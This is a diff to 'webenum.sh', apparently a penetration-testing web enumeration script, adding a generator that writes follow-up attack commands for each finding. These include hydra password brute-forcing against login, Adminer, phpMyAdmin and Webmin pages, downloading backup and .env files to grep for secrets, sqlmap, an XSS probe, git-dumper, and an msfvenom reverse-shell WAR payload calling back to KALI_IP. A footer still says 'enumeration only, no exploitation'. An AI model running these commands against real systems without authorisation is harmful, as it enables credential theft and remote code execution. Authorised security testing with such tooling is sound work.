@@ -38,6 +38,7 @@
 #     params/               parameter discovery (--deep)
 #     summary/
 #       summary.md          READ THIS FIRST — structured findings
+#       summary.txt         Plain-text alias of summary.md
 #       quick_wins.txt      high-value lines: 200s, auth prompts, interesting paths
 #==============================================================================
 
@@ -213,6 +214,27 @@ is_nonnegative_integer() {
     [[ "$1" =~ ^[0-9]+$ ]]
 }
 
+is_nonempty_file() {
+    [[ -f "$1" && -s "$1" ]]
+}
+
+append_next_finding() {
+    local next_file="$1"
+    local title="$2"
+    local evidence="$3"
+    shift 3
+
+    {
+        echo "## ${title}"
+        echo "Evidence: ${evidence}"
+        local cmd
+        for cmd in "$@"; do
+            [[ -n "$cmd" ]] && echo "$cmd"
+        done
+        echo ""
+    } >> "$next_file"
+}
+
 #==============================================================================
 # URL PARSING HELPERS
 #==============================================================================
@@ -304,6 +326,12 @@ phase_fingerprint() {
         --max-redirs 5 \
         -A "Mozilla/5.0 (X11; Linux x86_64)" \
         "$url" > "$outdir/headers.txt" 2>&1 || true
+
+    # --- HTTP methods (stored for finding-driven next steps) ---
+    info "  → HTTP OPTIONS methods"
+    timeout "$CURL_TIMEOUT" curl -skIX OPTIONS \
+        -A "Mozilla/5.0 (X11; Linux x86_64)" \
+        "$url" > "$outdir/http_methods.txt" 2>&1 || true
 
     # --- Homepage source (first 500 lines) ---
     info "  → fetching homepage source"
@@ -890,6 +918,284 @@ PYEOF
 }
 
 #==============================================================================
+# FINDING-DRIVEN NEXT STEPS
+#==============================================================================
+generate_next_steps() {
+    local url="$1"
+    local work_dir="$2"
+    local next_file="$work_dir/loot/next_steps.txt"
+    mkdir -p "$work_dir/loot"
+
+    {
+        echo "# Finding-Driven Web Next Steps — $url"
+        echo "# Generated: $(date)"
+        echo "# Commands below are emitted only from concrete webenum findings."
+        echo ""
+    } > "$next_file"
+
+    if is_nonempty_file "$work_dir/fingerprint/http_methods.txt" && \
+       grep -qiE 'Allow:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)|Public:.*(TRACE|PUT|DELETE|CONNECT|PROPFIND)' "$work_dir/fingerprint/http_methods.txt" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Risky HTTP method found" \
+            "$work_dir/fingerprint/http_methods.txt contains risky method in Allow/Public header" \
+            "curl -skIX OPTIONS ${url%/}/" \
+            "nmap --script http-methods -p $(get_port "$url") $(get_host "$url")" \
+            "curl -skI -X TRACE ${url%/}/ 2>/dev/null | sed -n '1,20p'"
+    fi
+
+    local disallow_paths
+    disallow_paths=$(grep -i 'Disallow:' "$work_dir/fingerprint/robots.txt" 2>/dev/null \
+        | grep -oP 'Disallow:\s*\K\S+' | grep -v '^\*$' | head -3)
+    if [[ -n "$disallow_paths" ]]; then
+        local robot_cmds=()
+        while IFS= read -r rpath; do
+            [[ -z "$rpath" ]] && continue
+            robot_cmds+=("curl -sk -o /dev/null -w '%{http_code} ${url%/}${rpath}\\n' '${url%/}${rpath}'")
+        done <<< "$disallow_paths"
+        append_next_finding "$next_file" \
+            "robots.txt disallowed paths found" \
+            "$work_dir/fingerprint/robots.txt contains Disallow entries" \
+            "${robot_cmds[@]}"
+    fi
+
+    local auth_hits
+    auth_hits=$(grep -h '| 401 |' "$work_dir/content/"*.txt "$work_dir/content/recursive/"*.txt 2>/dev/null | head -3)
+    if [[ -n "$auth_hits" ]]; then
+        local auth_cmds=()
+        while IFS= read -r auth_line; do
+            local auth_url auth_path
+            auth_url=$(echo "$auth_line" | awk '{print $1}')
+            auth_path="${auth_url#${url%/}}"
+            [[ "$auth_path" == "$auth_url" || -z "$auth_path" ]] && auth_path="/"
+            auth_cmds+=("hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-get ${auth_path}")
+        done <<< "$auth_hits"
+        append_next_finding "$next_file" \
+            "HTTP auth required path found" \
+            "ffuf output contains 401 responses" \
+            "${auth_cmds[@]}"
+    fi
+
+    local login_hits
+    login_hits=$(grep -hiE '/(login|signin|auth|wp-login|admin).*(\| 200 \||\] http)' "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | head -3)
+    if [[ -n "$login_hits" ]]; then
+        append_next_finding "$next_file" \
+            "Login page discovered" \
+            "content/sensitive path output contains login/admin 200 response" \
+            "curl -sk ${url%/}/login | sed -n '1,80p'" \
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/login:username=^USER^&password=^PASS^:F=Invalid'" \
+            "ffuf -w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt -u '${url%/}/login?FUZZ=test' -mc all -fs 0"
+    fi
+
+    local sensitive_hits
+    sensitive_hits=$(grep -hiE '\.(bak|sql|env|config|conf|xml|json|zip|tar|gz|old|backup|log).*\| 200 \|' "$work_dir/content/"*.txt 2>/dev/null | awk '{print $1}' | head -5)
+    if [[ -n "$sensitive_hits" ]]; then
+        local sens_cmds=()
+        while IFS= read -r found_url; do
+            [[ -z "$found_url" ]] && continue
+            sens_cmds+=("curl -sk '${found_url}' -o /tmp/loot_$(basename "${found_url%%\?*}") && grep -iE 'pass|secret|key|token|user|db_' /tmp/loot_$(basename "${found_url%%\?*}")")
+        done <<< "$sensitive_hits"
+        append_next_finding "$next_file" \
+            "Sensitive file discovered" \
+            "content ffuf output contains sensitive extension with HTTP 200" \
+            "${sens_cmds[@]}"
+    fi
+
+    local interesting_hits
+    interesting_hits=$(grep -hiE '/(admin|upload|api|console|manager|phpmyadmin|wp-admin|cgi).*\| (200|301|302|401|403) \|' "$work_dir/content/"*.txt 2>/dev/null | awk '{print $1}' | head -4)
+    if [[ -n "$interesting_hits" ]]; then
+        local int_cmds=()
+        while IFS= read -r found_url; do
+            [[ -z "$found_url" ]] && continue
+            int_cmds+=("curl -skI '${found_url}'")
+        done <<< "$interesting_hits"
+        append_next_finding "$next_file" \
+            "Interesting directory or endpoint discovered" \
+            "content ffuf output contains admin/upload/api/console-style path" \
+            "${int_cmds[@]}"
+    fi
+
+    local cms_whatweb="$work_dir/fingerprint/whatweb.txt"
+    local cms_paths="$work_dir/fingerprint/sensitive_paths.txt"
+
+    if grep -qiE '/\.git/(HEAD|config)|\.git/HEAD' "$work_dir/fingerprint/sensitive_paths.txt" "$work_dir/content/"*.txt 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Exposed Git repository found" \
+            "sensitive path or content output matched /.git/HEAD or /.git/config" \
+            "curl -sk ${url%/}/.git/HEAD" \
+            "git-dumper ${url%/}/.git ./git_$(get_host "$url")" \
+            "grep -RniE 'pass|secret|key|token|cred|db_' ./git_$(get_host "$url") 2>/dev/null | head -50"
+    fi
+
+    local upload_hits
+    upload_hits=$(grep -hiE '/(upload|uploads|filemanager|files|media).*(\| (200|301|302|401|403) \||\] http)' "$work_dir/content/"*.txt "$work_dir/fingerprint/sensitive_paths.txt" 2>/dev/null | awk '{print $1}' | head -3)
+    if [[ -n "$upload_hits" ]]; then
+        local upload_cmds=()
+        while IFS= read -r upload_url; do
+            [[ -z "$upload_url" || "$upload_url" == \[* ]] && continue
+            upload_cmds+=("curl -skI '${upload_url}'")
+            upload_cmds+=("ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-files.txt -u '${upload_url%/}/FUZZ' -mc 200,201,204,301,302,401,403")
+        done <<< "$upload_hits"
+        append_next_finding "$next_file" \
+            "Upload or file-management path found" \
+            "content/sensitive path output matched upload/files/media path" \
+            "${upload_cmds[@]:0:6}"
+    fi
+
+    if grep -qiE 'swagger|openapi|api-docs' "$work_dir/fingerprint/sensitive_paths.txt" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Swagger/OpenAPI surface found" \
+            "path/source output matched swagger/openapi/api-docs" \
+            "curl -sk ${url%/}/swagger.json | jq .info,.paths 2>/dev/null" \
+            "curl -sk ${url%/}/openapi.json | jq .info,.paths 2>/dev/null" \
+            "ffuf -w /usr/share/seclists/Discovery/Web-Content/api/objects.txt -u '${url%/}/api/FUZZ' -mc 200,201,204,301,302,401,403"
+    fi
+
+    if grep -qiE '/actuator|spring|whitelabel error page' "$work_dir/fingerprint/whatweb.txt" "$work_dir/fingerprint/headers.txt" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Spring actuator or Spring app indicators found" \
+            "fingerprint/content output matched Spring or actuator" \
+            "curl -sk ${url%/}/actuator" \
+            "curl -sk ${url%/}/actuator/env | jq . 2>/dev/null" \
+            "ffuf -w /usr/share/seclists/Discovery/Web-Content/spring-boot.txt -u ${url%/}/FUZZ -mc 200,401,403"
+    fi
+
+    if grep -qiE 'Adminer|/adminer' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Adminer detected" \
+            "whatweb/path/content output matched Adminer" \
+            "curl -sk ${url%/}/adminer/ | sed -n '1,80p'" \
+            "curl -sk ${url%/}/adminer.php | sed -n '1,80p'" \
+            "hydra -l root -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/adminer.php:auth[server]=localhost&auth[username]=^USER^&auth[password]=^PASS^:F=Login failed'"
+    fi
+
+    if grep -qiE 'Grafana|grafana' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Grafana detected" \
+            "fingerprint/content output matched Grafana" \
+            "curl -sk ${url%/}/login | sed -n '1,80p'" \
+            "curl -sk ${url%/}/api/health" \
+            "nuclei -u ${url%/} -tags grafana"
+    fi
+
+    if grep -qiE 'Webmin|webmin' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Webmin detected" \
+            "fingerprint/content output matched Webmin" \
+            "curl -skI ${url%/}/" \
+            "searchsploit webmin" \
+            "hydra -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/wordlists/fasttrack.txt ${url%/} https-post-form '/session_login.cgi:user=^USER^&pass=^PASS^:F=Login failed'"
+    fi
+
+    if grep -qiE 'JBoss|WildFly|jmx-console|/jmx-console|/web-console' "$cms_whatweb" "$cms_paths" "$work_dir/content/"*.txt "$work_dir/fingerprint/homepage_source.html" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "JBoss/WildFly management surface found" \
+            "fingerprint/content output matched JBoss/WildFly console" \
+            "curl -skI ${url%/}/jmx-console/" \
+            "curl -skI ${url%/}/web-console/" \
+            "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-directories.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
+    fi
+
+    if grep -qiE 'Elasticsearch|\"cluster_name\"|/_cat|:9200' "$cms_whatweb" "$work_dir/fingerprint/headers.txt" "$work_dir/fingerprint/homepage_source.html" "$work_dir/content/"*.txt 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Elasticsearch indicators found" \
+            "fingerprint/source/content output matched Elasticsearch" \
+            "curl -sk ${url%/}/_cluster/health?pretty" \
+            "curl -sk ${url%/}/_cat/indices?v" \
+            "curl -sk ${url%/}/_search?pretty -H 'Content-Type: application/json' -d '{\"query\":{\"match_all\":{}},\"size\":5}'"
+    fi
+
+    if is_nonempty_file "$work_dir/vhosts/hosts_entries.txt"; then
+        local vhost_cmds=()
+        while IFS= read -r vhost_entry; do
+            [[ -z "$vhost_entry" ]] && continue
+            local vhost_name
+            vhost_name=$(echo "$vhost_entry" | awk '{print $2}')
+            [[ -n "$vhost_name" ]] || continue
+            vhost_cmds+=("echo '$vhost_entry' | sudo tee -a /etc/hosts")
+            vhost_cmds+=("./webenum.sh --url $(get_proto "$url")://${vhost_name}")
+        done < <(head -3 "$work_dir/vhosts/hosts_entries.txt")
+        append_next_finding "$next_file" \
+            "VHost discovered" \
+            "$work_dir/vhosts/hosts_entries.txt is non-empty" \
+            "${vhost_cmds[@]}"
+    fi
+
+    if grep -qi 'WordPress\|wp-login\|wp-content' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "WordPress detected" \
+            "whatweb or path probes matched WordPress" \
+            "wpscan --url ${url%/} --enumerate u,vp,vt --plugins-detection aggressive" \
+            "wpscan --url ${url%/} --enumerate u --passwords /usr/share/wordlists/fasttrack.txt" \
+            "curl -sk ${url%/}/wp-login.php | sed -n '1,40p'"
+    fi
+
+    if grep -qi 'Joomla\|/administrator' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Joomla detected" \
+            "whatweb or path probes matched Joomla/administrator" \
+            "joomscan --url ${url%/} --enumerate-components" \
+            "curl -sk ${url%/}/administrator/ | sed -n '1,60p'" \
+            "ffuf -w /usr/share/seclists/Discovery/Web-Content/CMS/joomla.fuzz.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
+    fi
+
+    if grep -qi 'Drupal\|CHANGELOG.txt\|/user/login' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Drupal detected" \
+            "whatweb or path probes matched Drupal" \
+            "droopescan scan drupal -u ${url%/}" \
+            "curl -sk ${url%/}/CHANGELOG.txt | head -20" \
+            "curl -sk ${url%/}/user/login | sed -n '1,60p'"
+    fi
+
+    if grep -qi 'Tomcat\|/manager\|/manager/html' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Tomcat manager surface detected" \
+            "whatweb or path probes matched Tomcat/manager" \
+            "curl -skI ${url%/}/manager/html" \
+            "nxc http ${url%/} -u tomcat -p tomcat --path /manager/html" \
+            "msfvenom -p java/jsp_shell_reverse_tcp LHOST=${KALI_IP} LPORT=4444 -f war -o shell.war"
+    fi
+
+    if grep -qi 'Jenkins\|/jenkins\|/script' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "Jenkins detected" \
+            "whatweb or path probes matched Jenkins" \
+            "curl -sk ${url%/}/login | sed -n '1,80p'" \
+            "curl -skI ${url%/}/script" \
+            "ffuf -w /usr/share/seclists/Discovery/Web-Content/raft-small-words.txt -u ${url%/}/FUZZ -mc 200,301,302,401,403"
+    fi
+
+    if grep -qi 'phpMyAdmin\|phpmyadmin\|/pma' "$cms_whatweb" "$cms_paths" 2>/dev/null; then
+        append_next_finding "$next_file" \
+            "phpMyAdmin detected" \
+            "whatweb or path probes matched phpMyAdmin" \
+            "curl -sk ${url%/}/phpmyadmin/ | sed -n '1,80p'" \
+            "hydra -l root -P /usr/share/wordlists/fasttrack.txt ${url%/} http-post-form '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^:F=Cannot log in'"
+    fi
+
+    local param_lines
+    param_lines=$(find "$work_dir/params" -name "*.txt" -exec grep -h '.' {} \; 2>/dev/null | grep -v '^No\|^-\|^URL' | head -3)
+    if [[ -n "$param_lines" ]]; then
+        local param_cmds=()
+        while IFS= read -r param_line; do
+            local param_url
+            param_url=$(echo "$param_line" | awk '{print $1}')
+            [[ "$param_url" == http* ]] || continue
+            param_cmds+=("sqlmap -u '${param_url}' --batch --level 2")
+            param_cmds+=("curl -sk '${param_url/testvalue/%3Cscript%3Ealert(1)%3C%2Fscript%3E}'")
+        done <<< "$param_lines"
+        append_next_finding "$next_file" \
+            "Parameter discovered" \
+            "params output contains generated URL with parameter" \
+            "${param_cmds[@]}"
+    fi
+
+    if ! grep -q '^## ' "$next_file" 2>/dev/null; then
+        echo "(no grounded web next-step commands generated)" >> "$next_file"
+    fi
+}
+
+#==============================================================================
 # PHASE 6 — SUMMARY GENERATION
 #==============================================================================
 generate_summary() {
@@ -899,6 +1205,7 @@ generate_summary() {
     mkdir -p "$summary_dir"
 
     phase "Phase 6 — Generating Summary"
+    generate_next_steps "$url" "$work_dir"
 
     local proto=""
     proto=$(get_proto "$url")
@@ -1052,23 +1359,22 @@ generate_summary() {
         # --- Next Steps ---
         echo "## Next Steps"
         echo ""
-        echo "1. **Burp Suite** — open interesting 200/401 paths for manual testing"
-        echo "2. **401/403 paths** — try hydra default creds (see quick_wins.txt)"
-        echo "3. **Login forms** — hydra http-post-form or manual: admin/admin, admin/password"
-        echo "4. **Sensitive files** (.bak/.sql/.env) — curl download + grep for creds"
-        echo "5. **VHosts found** — add to /etc/hosts, re-run: \`./webenum.sh --url http://<vhost>\`"
-        echo "6. **Parameters** — test for SQLi: \`sqlmap -u '${url}?param=1' --batch\`"
-        if grep -qi 'WordPress' "$work_dir/fingerprint/whatweb.txt" 2>/dev/null; then
-            echo "7. **WordPress** — \`wpscan --url ${url} --enumerate u,vp,vt\`"
-        fi
-        if [[ "$DEEP_MODE" != "true" ]]; then
-            echo "8. **Stuck?** — re-run with \`--deep\` for recursive + parameter fuzzing"
+        echo "Full command library: \`$work_dir/loot/next_steps.txt\`"
+        echo ""
+        if is_nonempty_file "$work_dir/loot/next_steps.txt"; then
+            awk '
+                /^## / {shown++; if (shown > 4) exit}
+                shown > 0 && !/^# Finding-Driven/ && !/^# Generated/ && !/^# Commands below/ {print}
+            ' "$work_dir/loot/next_steps.txt"
+        else
+            echo "(no grounded web next-step commands generated)"
         fi
         echo ""
         echo "---"
         echo "*Generated by webenum — enumeration only, no exploitation*"
 
     } > "$summary_dir/summary.md"
+    cp "$summary_dir/summary.md" "$summary_dir/summary.txt" 2>/dev/null || true
 
     # Generate quick_wins.txt — just the high-value lines for fast review
     {
@@ -1293,6 +1599,7 @@ generate_summary() {
     } > "$summary_dir/quick_wins.txt"
 
     success "Summary written to $summary_dir/summary.md"
+    success "Plain-text summary written to $summary_dir/summary.txt"
     success "Quick wins written to $summary_dir/quick_wins.txt"
 }
 
@@ -1348,7 +1655,10 @@ OUTPUT:
     params/          GET parameter discovery (--deep)
     summary/
       summary.md     Structured findings — read this first
+      summary.txt    Plain-text alias of summary.md
       quick_wins.txt High-value lines only
+    loot/
+      next_steps.txt Finding-driven follow-up command library
 
 MODES:
   standard (default)
@@ -1624,10 +1934,21 @@ header "WEBENUM COMPLETE"
 echo ""
 success "Total time: ${MINUTES}m ${SECS}s"
 success "Results:    ${OUTPUT_DIR}/summary/summary.md"
+success "Text copy:  ${OUTPUT_DIR}/summary/summary.txt"
 echo ""
 echo -e "${BOLD}Quick wins:${NC}"
 cat "${OUTPUT_DIR}/summary/quick_wins.txt" 2>/dev/null | grep -v '^#\|^$' | \
     while IFS= read -r line; do
         echo -e "  ${GREEN}★${NC} $line"
     done
+echo ""
+echo -e "${BOLD}Grounded next steps:${NC}"
+if is_nonempty_file "${OUTPUT_DIR}/loot/next_steps.txt"; then
+    awk '
+        /^## / {shown++; if (shown > 3) exit}
+        shown > 0 && !/^# Finding-Driven/ && !/^# Generated/ && !/^# Commands below/ {print "  " $0}
+    ' "${OUTPUT_DIR}/loot/next_steps.txt"
+else
+    echo "  (no grounded web next-step commands generated)"
+fi
 echo ""
